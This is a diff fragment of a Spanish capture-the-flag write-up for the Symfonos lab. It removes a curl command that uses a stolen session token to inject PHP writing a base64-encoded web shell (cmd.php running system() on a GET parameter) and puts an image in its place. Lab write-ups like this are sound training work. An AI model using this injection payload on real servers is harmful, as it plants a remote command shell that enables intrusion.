@@ -202,7 +202,9 @@ Pongo en base64 este script php:
 ![image](https://github.com/user-attachments/assets/ee6ad1f0-b980-49c8-bc73-41822176ffc2)
 
 
-- `  curl -s -X PATCH "http://symfonos.local:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE0ODU3NDAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.SPUuZ3ybrOID6ktLJNDysNiJK_t97wdwCp5w18puiqg" -d $'{"text": "file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKIHN5c3RlbSgkX0dFVFsnY21kJ10pOwo/Pgo=\'))"}'   `
+
+![image](https://github.com/user-attachments/assets/124c5abc-5f35-4d43-95a8-1349374b4cd4)
+
 
 
 - `file_put_contents` -> Crear un archivo y ponerle lo que quieras.
